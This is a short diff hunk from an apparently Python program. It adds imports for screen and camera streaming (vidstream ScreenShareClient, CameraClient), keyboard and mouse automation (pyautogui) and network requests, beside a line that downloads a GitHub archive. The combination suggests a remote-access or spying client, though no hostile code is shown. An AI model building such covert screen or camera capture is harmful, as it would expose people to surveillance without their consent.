@@ -1,5 +1,5 @@
-import socket
-import zipfile, os, shutil, time, subprocess
+import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
+from vidstream import ScreenShareClient, CameraClient
 from turtle import left
 
 url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
